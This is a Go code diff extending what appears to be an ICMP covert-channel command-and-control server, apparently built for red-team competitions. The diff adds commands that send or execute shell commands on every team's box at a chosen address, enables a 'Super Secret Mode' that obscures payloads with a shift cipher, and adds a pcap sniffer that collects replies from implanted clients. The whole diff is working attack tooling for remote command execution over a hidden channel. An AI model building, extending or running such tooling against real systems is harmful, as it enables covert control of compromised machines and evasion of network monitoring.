@@ -2,12 +2,17 @@ package main
 
 import (
 	"bufio"
+	"bytes"
 	"fmt"
+	"log"
 	"net"
 	"os"
+	"sort"
 	"strconv"
 	"strings"
 
+	"github.com/google/gopacket"
+	"github.com/google/gopacket/pcap"
 	"golang.org/x/net/icmp"
 	"golang.org/x/net/ipv4"
 )
@@ -19,6 +24,10 @@ var execute = false
 var ID int = 0
 var c, ListenerError = icmp.ListenPacket("ip4:icmp", "0.0.0.0")
 var EncryptValue = 3
+var (
+	buffer = int32(1600)
+	filter = "icmp[icmptype] == icmp-echoreply"
+)
 
 func print_title() {
 	fmt.Println(".__                          ___             .__.__    ___")
@@ -42,12 +51,13 @@ func print_help() {
 	// fmt.Println("\texeonall <command>             Execute <command> on all clients")
 	// fmt.Println("\tsendtoteam <team> <command>    Send <command> to all <team> clients")
 	// fmt.Println("\texeonteam <team> <command>     Execute <command> on all <team> clients")
-	// fmt.Println("\texeonbox <oct>.<oct> <command> Execute <command> on all specific box")
+	fmt.Println("\tsendtobox <ip> <message>       Send <message> on all teams at 1.1.x.1 box")
+	fmt.Println("\texeonbox <1.1.x.1> <command>   Execute <command> on all teams at 1.1.x.1 box")
 	fmt.Println("\tload                           Loads all clients specified in targets.txt")
 	// fmt.Println("\tcheckalive                     Generates a board of replying clients")
 	// [FIX] fmt.Println("\tshell <ID>                     Creates a direct line with client at ID")
 	fmt.Println("\tkill                           Stops server")
-	// fmt.Println("\tssm                            Toggles Super Secret Mode")
+	fmt.Println("\tssm                            Toggles Super Secret Mode")
 	// fmt.Println("\tdebug                          Toggles Debug")
 	fmt.Println("\thelp                           Prints this")
 }
@@ -72,8 +82,14 @@ func RemoveAllClients() {
 }
 
 func ShowClients() {
-	for id, ip := range clients {
-		fmt.Printf("ID: %d, IP: %s\n", id, ip)
+	keys := make([]int, 0, len(clients))
+	for k := range clients {
+		keys = append(keys, k)
+	}
+	sort.Ints(keys)
+	for _, k := range keys {
+		ClientString := "ID: " + strconv.Itoa(k) + ", IP: " + clients[k]
+		fmt.Println(ClientString)
 	}
 }
 
@@ -89,11 +105,45 @@ func LoadClients() {
 	}
 }
 
+func SendToBox(ip string, command string) {
+	var Valid bool
+	var XIndex int
+	DestOctets := strings.Split(ip, ".")
+	for X, TestOctet := range DestOctets {
+		if TestOctet == "x" || TestOctet == "X" {
+			XIndex = X
+		}
+	}
+	for ClientID, ClientIP := range clients {
+		Valid = true
+		ClientOctets := strings.Split(ClientIP, ".")
+		for ClientIndex, ClientOctet := range ClientOctets {
+			if ClientIndex == XIndex {
+				continue
+			} else {
+				if ClientOctet != DestOctets[ClientIndex] {
+					Valid = false
+				} else {
+					continue
+				}
+			}
+		}
+		if Valid {
+			Send(command, ClientID)
+		} else {
+			continue
+		}
+	}
+}
+
 func GenerateHeader(segment int, segmented bool, ip string) string {
 	SegmentNum := strconv.Itoa(segment)
 	header := "!!!"
-	// ### is server flag, value 1 (SSM) is Encryption option, 2 is execution option
-	// 3 is segment for oversized packets, 4 is segment ID
+	// ### is server flag
+	// Value 1 (SSM) is Encryption option
+	// Value 2 is execution option
+	// Value 3 is segment for oversized packets
+	// Value 4 is segment ID
 	if SSM {
 		header += "1"
 	} else {
@@ -110,13 +160,13 @@ func GenerateHeader(segment int, segmented bool, ip string) string {
 		header += "0"
 	}
 	header += SegmentNum
-	header += "[" + ip + "]"
+	header += "[" + ip + "]" // Append IP to header for NAT
 	return header
 }
 
 func MakePacket(payload string) {
 	if SSM {
-		payload = encrypt(payload)
+		payload = payload[0:3] + encrypt(payload[3:])
 	}
 	packet := icmp.Message{
 		Type: ipv4.ICMPTypeEcho,
@@ -153,7 +203,6 @@ func Send(message string, id int) {
 		MakePacket(payload)
 		SendPackets(clients[id], *c)
 	}
-
 	fmt.Println("[DEBUG]", message, "sent to client", id, "at", clients[id])
 }
 
@@ -190,6 +239,48 @@ func decrypt(plaintext string) string {
 		encrypted += string(rune(int(plaintext[i]) - 3))
 	}
 	return encrypted
+}
+
+func convert(values []byte) string {
+	var converted string
+	converted = bytes.NewBuffer(values).String()
+	return converted
+}
+
+func sniffer() {
+	handler, err := pcap.OpenLive("ens160", buffer, false, pcap.BlockForever)
+	if err != nil {
+		log.Fatal(err)
+	}
+	defer handler.Close()
+	if err := handler.SetBPFFilter(filter); err != nil {
+		log.Fatal(err)
+	}
+	source := gopacket.NewPacketSource(handler, handler.LinkType())
+	for packet := range source.Packets() {
+		payload := convert(packet.ApplicationLayer().Payload())
+		if strings.HasPrefix(payload, "###") {
+			parts := strings.Split(payload, "[")
+
+			// get the part before "["
+			header := parts[0]
+
+			// get the part after "["
+			AfterHeader := parts[1]
+
+			// split the string by "]"
+			parts = strings.Split(AfterHeader, "]")
+
+			// get the part before "]"
+			ip := parts[0]
+
+			fmt.Println("before:", header)
+			fmt.Println("inner:", ip)
+			fmt.Println("after:", parts[1])
+		} else {
+			continue
+		}
+	}
 }
 
 func main() {
@@ -231,14 +322,24 @@ func main() {
 			execute = false
 			message, id := ParseID(tokens)
 			Send(message, id)
+		case "sendtobox":
+			execute = false
+			FixMe := strings.Split(tokens[1], " ")
+			SendToBox(FixMe[0], FixMe[1])
+		case "exeonbox":
+			execute = true
+			FixMe := strings.Split(tokens[1], " ")
+			SendToBox(FixMe[0], FixMe[1])
 		case "exe":
 			execute = true
 			message, id := ParseID(tokens)
 			Send(message, id)
 		case "ssm":
 			if SSM {
+				SSM = false
 				fmt.Println("[DEBUG] Super Secret Mode disabled.")
 			} else {
+				SSM = true
 				fmt.Println("[DEBUG] Super Secret Mode enabled.")
 			}
 		case "kill":
